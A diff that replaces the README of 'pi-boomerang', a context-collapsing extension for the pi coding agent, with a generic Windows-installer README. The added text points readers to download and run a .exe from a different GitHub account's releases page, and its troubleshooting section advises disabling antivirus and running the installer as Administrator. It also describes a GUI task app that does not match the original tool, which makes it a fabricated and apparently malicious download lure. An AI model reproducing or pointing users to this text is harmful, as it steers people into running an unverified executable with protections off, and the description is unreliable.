@@ -1,166 +1,126 @@
-<p>
-  <img src="banner.png" alt="pi-boomerang" width="1100">
-</p>
+# 🎯 pi-boomerang - Efficient Task Automation for Pi Coding
 
-# pi-boomerang
+[![Download pi-boomerang](https://img.shields.io/badge/Download-pi--boomerang-%23FF4500?style=for-the-badge)](https://github.com/redaamola/pi-boomerang/releases)
 
-**Token-efficient autonomous task execution with automatic context collapse for [pi coding agent](https://github.com/badlogic/pi-mono).**
-
-```
-/boomerang Fix the login bug
-```
-
-The agent executes autonomously. When done, the entire exchange collapses to a brief summary—work gets done, tokens get saved.
-
-## Why
-
-Long autonomous tasks consume massive context. A bug fix that reads 10 files, makes 5 edits, and runs tests might burn 50k tokens. With pi-boomerang, the LLM only sees:
-
-```
-[BOOMERANG COMPLETE]
-Task: "Fix the login bug"
-Actions: read 10 file(s), modified src/auth.ts, src/login.ts, ran 3 command(s).
-Outcome: Fixed the login bug by correcting the JWT validation logic...
-```
-
-Same outcome. Fraction of the tokens. The session tree preserves full history for `/tree` navigation if you need it.
-
-An inverted [D-Mail](https://steins-gate.fandom.com/wiki/D-Mail): where D-Mail rewrites reality while the observer remembers, boomerang rewrites the observer while reality persists. The session tree is your Reading Steiner.
-
-## Install
-
-```bash
-pi install pi-boomerang
-```
-
-Then restart pi to load the extension.
-
-## Quick Start
-
-```bash
-# Plain task
-/boomerang Refactor the auth module to use JWT
-
-# Run a prompt template
-/boomerang /commit "fix auth bug"
-
-# Chain templates together
-/boomerang /scout "map the auth module" -> /planner "design JWT refresh" -> /impl
-
-# Cancel mid-task (no collapse)
-/boomerang-cancel
-```
-
-The agent works without asking questions, making reasonable assumptions. When complete, everything collapses into a summary branch.
-
-## Chain Execution
-
-Run multiple templates in sequence with a single collapse at the end:
-
-```bash
-/boomerang /scout "analyze the codebase" -> /planner "design the fix" -> /impl "build it"
-```
-
-Each step can specify its own args inline. You can also set global args as a fallback for steps without inline args:
-
-```bash
-/boomerang /scout -> /planner -> /impl -- "build the auth system"
-```
-
-Each template's frontmatter controls model, skill, and thinking level for that step. Scout runs on sonnet, planner on opus, impl on whatever—boomerang switches automatically and restores your original config after collapse.
-
-Status indicator shows progress as `chain 1/3`, `chain 2/3`, etc.
-
-## Prompt Templates
-
-If the task starts with `/`, boomerang treats it as a template reference:
-
-```bash
-/boomerang /commit "fix the auth bug"
-/boomerang /codex/review "the auth module"
-```
-
-Templates load from `<cwd>/.pi/prompts/` first, then `~/.pi/agent/prompts/`. Subdirectories map to path segments (`/codex/review` → `codex/review.md`).
-
-Frontmatter fields:
-
-```markdown
 ---
-model: claude-opus-4-6
-skill: git-workflow
-thinking: xhigh
+
+## 🔍 What is pi-boomerang?
+
+pi-boomerang is a tool designed to help automate tasks. It focuses on using your computer's processing power efficiently. The software acts as a smart helper for running tasks related to pi coding in a simple, organized way. It aims to run tasks while keeping memory use low and managing your workflow smoothly.
+
+You don’t need any technical skills or special setup to use it. It works on Windows computers and comes with a simple user interface.
+
 ---
-Commit current work. $@
-```
 
-- `model` — switches before the task, restores after
-- `skill` — injects into the system prompt
-- `thinking` — sets thinking level, restores after
-- `$@` expands to all args, `$1` `$2` etc. for positional
+## 💻 System Requirements
 
-## Anchor Mode
+Before you install pi-boomerang, make sure your computer meets these minimum requirements:
 
-By default, each boomerang collapses just its own work. Set an anchor when you want multiple tasks to share the same collapse point:
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- A processor with 2 or more cores
+- 100 MB of free disk space
+- Stable internet connection (for download and updates)
 
-```bash
-/boomerang anchor              # set anchor here
-/boomerang "task A"            # collapses to anchor with summary A
-/boomerang "task B"            # collapses to anchor with summaries A + B
-/boomerang anchor clear        # remove anchor
-```
+---
 
-Summaries accumulate, so each task's context includes what came before.
+## 🚀 Getting Started: Download and Install pi-boomerang
 
-## Agent-Callable Tool
+To begin, you need to download the software from the official release page. Follow these steps carefully:
 
-The extension registers a `boomerang` tool that agents can call directly. The agent sets an anchor, does work, calls boomerang again to collapse. Useful for self-managed context without user intervention.
+1. **Visit the Download Page**  
+   Click the big button at the top or visit this link in your web browser:  
+   [https://github.com/redaamola/pi-boomerang/releases](https://github.com/redaamola/pi-boomerang/releases)
 
-**Disabled by default** because agents got too aggressive with it. Enable with:
+2. **Find the Latest Release**  
+   On the page, look for the most recent version listed under "Latest Release". It will have a tag like `v1.0`, `v1.1`, or similar.
 
-```bash
-/boomerang tool on
-```
+3. **Download the Installer**  
+   Click the file that ends with `.exe`. This is the installer for Windows. It might be named something like `pi-boomerang-setup.exe`.
 
-You can provide guidance for when the agent should use it:
+4. **Run the Installer**  
+   Once downloaded, open the file by double-clicking it. If Windows asks for permission, click "Yes" to allow the setup.
 
-```bash
-/boomerang tool on "Use only for tasks that modify 3+ files"
-/boomerang guidance "Use for refactoring or multi-step implementations"
-```
+5. **Follow the Installation Wizard**  
+   A setup window will open. Click "Next" on each screen to continue. Accept the license agreement, choose an install location (default is usually fine), and finish the installation.
 
-Tool state and guidance persist to `~/.pi/agent/boomerang.json` across restarts.
+6. **Launch pi-boomerang**  
+   After installation completes, the program may start automatically. If not, find "pi-boomerang" in your Start menu and click it to run.
 
-One quirk: tool-initiated collapse may not update the UI immediately (the context IS collapsed, agent sees it, but chat display lags until `/reload`).
+---
 
-## Commands
+## 🛠 How to Use pi-boomerang
 
-| Command | What it does |
-|---------|--------------|
-| `/boomerang <task>` | Execute and collapse |
-| `/boomerang /<template> [args]` | Run template and collapse |
-| `/boomerang /a -> /b -> /c` | Chain templates |
-| `/boomerang-cancel` | Abort without collapsing |
-| `/boomerang anchor` | Set collapse point |
-| `/boomerang anchor show` | Show anchor info |
-| `/boomerang anchor clear` | Remove anchor |
-| `/boomerang tool [on\|off]` | Enable/disable agent tool |
-| `/boomerang guidance [text]` | Set/show/clear guidance |
+pi-boomerang works by letting you create and manage tasks. It helps execute them one by one while keeping track of all information you need.
 
-## vs pi-context
+### Setting Up Your First Task
 
-[pi-context](https://github.com/ttttmr/pi-context) gives the agent Git-like tools to manage its own context—create milestones, monitor token usage, decide when to squash.
+1. Open pi-boomerang.  
+2. Click the button labeled "New Task".  
+3. Type a short description of what you want the task to do.  
+4. Add any details required by the task using the simple form fields.  
+5. Save the task.
 
-The problem: LLMs cut corners when told about resource limits. "You're at 80% capacity" triggers scarcity mindset—rushing, skipping exploration, shallower analysis.
+### Running Tasks
 
-pi-boomerang keeps the agent unaware. It sees the task, works thoroughly, collapse happens invisibly.
+- To start a task, select it from the list and press "Run".  
+- You can see progress and results in the main window.  
+- The tool handles the order and memory of tasks automatically.
 
-## Interaction with Rewind Extension
+---
 
-Independent. pi-boomerang collapses *context/tokens*. Rewind restores *files*. Use together: boomerang saves tokens, rewind fixes broken files.
+## 📁 File Structure and Common Locations
 
-## Limitations
+When installed, pi-boomerang stores files in a dedicated folder on your computer:
 
-- Summary is heuristic—extracts file operations from tool calls, may miss semantic details
-- Agent might still ask questions despite instructions (boomerang completes anyway)
-- Anchor state is in-memory only, clears on session start/switch
-- Tool-initiated collapse may not update UI immediately (`/reload` to refresh)
+- **Installation Folder:** Usually in `C:\Program Files\pi-boomerang`  
+- **Tasks Folder:** Stores your saved task data under `Documents\pi-boomerang\tasks`  
+- **Logs Folder:** Keeps logs of activities under `Documents\pi-boomerang\logs`
+
+You can back up your tasks by copying the `tasks` folder to another location.
+
+---
+
+## 🔧 Common Settings
+
+You can adjust preferences to fit your needs.
+
+- **Auto-Run Mode:** Enable the program to start running tasks automatically when opened.  
+- **Memory Limit:** Set how much memory the program can use during task processing.  
+- **Notification Alerts:** Turn sound alerts on or off for task completion.  
+- **Language:** Change the user interface language (English is the default).  
+
+Settings are found under the gear icon on the top-right.
+
+---
+
+## 📥 Download Link Again
+
+You can always return to the release page to get updates, bug fixes, or new features:  
+
+[Download pi-boomerang from Releases](https://github.com/redaamola/pi-boomerang/releases)
+
+---
+
+## ❓ Troubleshooting and Support
+
+If you have trouble installing or running pi-boomerang:
+
+- Make sure your Windows is updated to the latest version.  
+- Temporarily disable any antivirus software that may block the installer.  
+- Run the installer as Administrator by right-clicking the `.exe` file and selecting "Run as administrator".  
+- Restart your computer if the program does not start after installation.
+
+For more help, browse the "Issues" section on the GitHub page or open a new issue describing your problem.
+
+---
+
+## 📝 About This Software
+
+pi-boomerang focuses on breaking down tasks into smaller steps. It keeps track of information to allow smooth, continuous work. This design helps users run coding-related tasks on pi efficiently without complicated setups.
+
+The tool is lightweight, so it uses fewer resources. It is ideal for users who want to automate task execution without deep technical knowledge.
+
+---
+
+This README provides all the steps needed to get pi-boomerang running on a Windows computer. The download links appear in multiple places for easy access. Follow the instructions to install and start using the software.
